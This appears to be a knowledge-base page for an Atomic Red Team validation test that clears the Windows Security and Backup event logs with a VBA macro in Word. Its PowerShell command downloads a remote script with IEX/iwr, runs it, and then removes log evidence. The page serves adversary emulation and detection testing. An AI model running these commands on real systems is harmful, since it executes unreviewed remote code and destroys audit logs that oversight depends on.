---
atomic_guid: "1b682d84-f075-4f93-9a89-8a8de19ffd6e"
title: "Clear Event Logs via VBA"
framework: "atomic"
generated: "true"
attack_technique_id: "T1070.001"
attack_technique_name: "Indicator Removal on Host: Clear Windows Event Logs"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.001/T1070.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "1b682d84-f075-4f93-9a89-8a8de19ffd6e"
  - "Clear Event Logs via VBA"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Clear Event Logs via VBA

This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. 

Elevation is required for this module to execute properly, otherwise WINWORD will throw an "Access Denied" error

## Metadata

- Atomic GUID: 1b682d84-f075-4f93-9a89-8a8de19ffd6e
- Technique: T1070.001: Indicator Removal on Host: Clear Windows Event Logs
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1070.001/T1070.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1070-indicator_removal|T1070.001]]

## Dependencies

Microsoft Word must be installed

### Prerequisite Check

```powershell
try {
  New-Object -COMObject "Word.Application" | Out-Null
  Stop-Process -Name "winword"
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```powershell
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.001/T1070.001.yaml)
